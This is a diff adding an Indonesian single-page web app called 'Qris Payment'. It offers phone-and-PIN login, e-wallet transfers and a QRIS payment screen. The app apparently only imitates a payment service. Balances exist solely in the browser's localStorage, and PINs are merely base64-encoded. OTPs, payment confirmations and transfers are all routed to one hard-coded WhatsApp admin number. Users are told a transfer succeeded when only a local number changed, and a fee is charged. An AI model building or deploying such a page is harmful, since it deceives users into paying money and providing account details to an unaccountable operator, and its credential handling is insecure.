@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Qris Payment</title>
+<link rel="icon" type="image/png" href="icon.png" />
+<style>
+  body{font-family:system-ui,-apple-system,Segoe UI,Arial;background:#f4f6f8;margin:0;padding:20px;color:#111;}
+  .card{background:#fff;border-radius:12px;box-shadow:0 8px 20px rgba(0,0,0,0.05);padding:16px;margin-bottom:20px;}
+  input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e3e8ef;margin-top:6px;box-sizing:border-box;}
+  button{background:#0b84ff;color:#fff;border:0;border-radius:8px;padding:10px 14px;cursor:pointer;}
+  button.ghost{background:transparent;border:1px solid #0b84ff;color:#0b84ff;}
+  img.qris{width:260px;height:auto;border-radius:10px;display:block;margin:10px auto;}
+  .muted{color:#6b7280;}
+</style>
+</head>
+<body>
+
+<div id="login-card" class="card">
+  <h2>Masuk atau Daftar Qris Payment</h2>
+  <input id="phone" placeholder="Nomor HP"/>
+  <div id="otp-section" style="display:none;">
+    <input id="otp" placeholder="Masukkan OTP"/>
+  </div>
+  <input id="pin" type="password" maxlength="4" placeholder="PIN"/>
+  <div style="margin-top:10px;">
+    <button onclick="proceed()">Lanjut</button>
+    <button class="ghost" onclick="resetAll()">Reset Data</button>
+  </div>
+  <p class="muted" style="margin-top:10px;">Data disimpan aman di perangkat kamu (localStorage).</p>
+</div>
+
+<div id="dashboard" class="card" style="display:none;">
+  <h2>Selamat Datang, <span id="acc-name"></span></h2>
+  <p>Saldo: <b id="acc-balance">Rp0</b></p>
+  <div style="margin-top:10px;">
+    <button onclick="showEwallet()">E-Wallet</button>
+    <button onclick="showQris()">Tampilkan QRIS</button>
+    <button class="ghost" onclick="logout()">Keluar</button>
+  </div>
+</div>
+
+<div id="ewallet-card" class="card" style="display:none;">
+  <h3>Kirim Uang (E-Wallet)</h3>
+  <select id="ewallet-select">
+    <option value="DANA">DANA</option>
+    <option value="OVO">OVO</option>
+    <option value="GoPay">GoPay</option>
+    <option value="ShopeePay">ShopeePay</option>
+  </select>
+  <input id="target-phone" placeholder="Nomor Tujuan"/>
+  <input id="amount" type="number" placeholder="Jumlah (Rp)"/>
+  <input id="pin-ewallet" type="password" maxlength="4" placeholder="Masukkan PIN"/>
+  <button onclick="sendMoney()">Transfer</button>
+  <button class="ghost" onclick="closeEwallet()">Tutup</button>
+</div>
+
+<div id="qris-card" class="card" style="display:none;text-align:center;">
+  <h3>Scan QRIS untuk Membayar</h3>
+  <img id="qris-img" class="qris" src="" alt="QRIS"/>
+  <button onclick="confirmQris()">Konfirmasi Pembayaran</button>
+  <button class="ghost" onclick="closeQris()">Tutup</button>
+</div>
+
+<script>
+function el(id){return document.getElementById(id);}
+function loadData(){
+  try{
+    const raw = localStorage.getItem('qris_app_data_v1');
+    return raw ? JSON.parse(raw) : {accounts:{}, qris_src:""};
+  }catch(e){return {accounts:{}, qris_src:""};}
+}
+function saveData(d){ localStorage.setItem('qris_app_data_v1', JSON.stringify(d)); }
+
+let currentUser = null;
+
+function proceed(){
+  const phone = el('phone').value.trim();
+  const pin = el('pin').value.trim();
+  const otp = el('otp').value.trim();
+  if(!phone){ return alert("Masukkan nomor HP."); }
+
+  const data = loadData();
+  const acc = data.accounts[phone];
+
+  if(acc){
+    if(atob(acc.pin_enc) !== pin){ return alert("PIN salah."); }
+    currentUser = acc;
+    showDashboard(acc);
+  } else {
+    if(!otp){
+      el('otp-section').style.display="block";
+      window.open(`https://wa.me/6287720718808?text=min%20minta%20otp%20${phone}`,'_blank');
+      return alert("Verifikasi OTP dikirim via WhatsApp admin.");
+    }
+    if(!pin){ return alert("Buat PIN 4 digit."); }
+    const newAcc = { phone, pin_enc:btoa(pin), balance:0, otps:[otp] };
+    data.accounts[phone] = newAcc;
+    saveData(data);
+    alert("Pendaftaran berhasil!");
+    currentUser = newAcc;
+    showDashboard(newAcc);
+  }
+}
+
+function showDashboard(acc){
+  el('login-card').style.display = "none";
+  el('dashboard').style.display = "block";
+  el('acc-name').textContent = acc.phone;
+  el('acc-balance').textContent = "Rp" + (acc.balance || 0);
+}
+
+function logout(){
+  currentUser = null;
+  el('dashboard').style.display="none";
+  el('login-card').style.display="block";
+}
+
+function showQris(){
+  const data = loadData();
+  const q = data.qris_src || "";
+  if(!q) return alert("QRIS belum diatur admin.");
+  el('qris-img').src = q;
+  el('qris-card').style.display = "block";
+}
+function closeQris(){ el('qris-card').style.display="none"; }
+
+function confirmQris(){
+  window.open(`https://wa.me/6287720718808?text=min%20konfirmasi%20saldo%20(foto%20bukti%20transfer)`, '_blank');
+}
+
+function showEwallet(){
+  el('dashboard').style.display="none";
+  el('ewallet-card').style.display="block";
+}
+function closeEwallet(){
+  el('ewallet-card').style.display="none";
+  el('dashboard').style.display="block";
+}
+
+function sendMoney(){
+  const target = el('target-phone').value.trim();
+  const amount = parseInt(el('amount').value || 0);
+  const type = el('ewallet-select').value;
+  const pinInput = el('pin-ewallet').value.trim();
+
+  if(!target || amount<=0) return alert("Isi nomor & jumlah.");
+  if(!pinInput) return alert("Masukkan PIN transfer.");
+
+  const data = loadData();
+  const sender = data.accounts[currentUser.phone];
+  if(atob(sender.pin_enc) !== pinInput) return alert("PIN salah.");
+
+  const adminFee = 350;
+  const total = amount + adminFee;
+  if(sender.balance < total) return alert(`Saldo tidak cukup. Butuh Rp${total}.`);
+
+  sender.balance -= total;
+  saveData(data);
+  el('acc-balance').textContent = "Rp" + sender.balance;
+  alert(`Transfer berhasil (Rp${amount}) dengan biaya admin Rp${adminFee}.`);
+
+  window.open(`https://wa.me/6287720718808?text=min%20transfer%20e-wallet%20${type}%20${target}`, '_blank');
+}
+
+function resetAll(){
+  if(!confirm("Hapus semua data lokal?")) return;
+  localStorage.removeItem('qris_app_data_v1');
+  alert("Data dihapus."); location.reload();
+}
+</script>
+</body>
+</html>
